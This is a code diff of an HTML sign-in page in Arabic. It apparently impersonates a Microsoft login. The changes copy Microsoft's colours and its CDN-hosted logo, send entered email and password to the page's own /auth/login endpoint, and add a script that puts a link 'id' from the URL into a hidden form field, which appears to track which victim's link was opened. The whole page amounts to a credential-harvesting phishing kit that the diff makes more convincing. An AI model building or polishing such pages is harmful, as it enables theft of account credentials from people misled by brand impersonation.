@@ -6,40 +6,43 @@
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      background-color: #f2f2f2;
+      background: #f3f2f1;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
     }
     .login-box {
       background: #fff;
-      padding: 30px;
-      width: 350px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 40px;
+      border-radius: 6px;
+      width: 360px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
       text-align: center;
     }
     .login-box img {
-      width: 100px;
+      width: 80px;
       margin-bottom: 20px;
     }
     .login-box h2 {
       margin-bottom: 20px;
+      color: #333;
     }
-    input[type="email"], input[type="password"] {
+    .form-control {
       width: 100%;
       padding: 10px;
       margin: 10px 0;
       border: 1px solid #ccc;
       border-radius: 4px;
+      text-align: left;
+      direction: ltr;
     }
     button {
-      width: 100%;
-      padding: 10px;
-      background: #0078d7;
+      background: #0067b8;
       color: #fff;
       border: none;
+      padding: 12px;
+      width: 100%;
       border-radius: 4px;
       cursor: pointer;
       font-size: 16px;
@@ -51,14 +54,24 @@
 </head>
 <body>
   <div class="login-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Logo">
+    <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
     <h2>تسجيل الدخول</h2>
     <form action="/auth/login" method="POST">
-      <input type="hidden" name="id" value="<%= id %>">
-      <input type="email" name="email" placeholder="أدخل بريدك الجامعي" required>
-      <input type="password" name="password" placeholder="كلمة المرور">
+      <input type="email" name="email" class="form-control" placeholder="البريد الإلكتروني" required>
+      <input type="password" name="password" class="form-control" placeholder="كلمة المرور" required>
+      <!-- حقل مخفي لتخزين الرابط المطلوب -->
+      <input type="hidden" id="linkId" name="id">
       <button type="submit">تسجيل الدخول</button>
     </form>
   </div>
+
+  <script>
+    // قراءة قيمة id من رابط الصفحة وإضافتها للحقل المخفي
+    const params = new URLSearchParams(window.location.search);
+    const linkId = params.get('id');
+    if (linkId) {
+      document.getElementById('linkId').value = linkId;
+    }
+  </script>
 </body>
 </html>
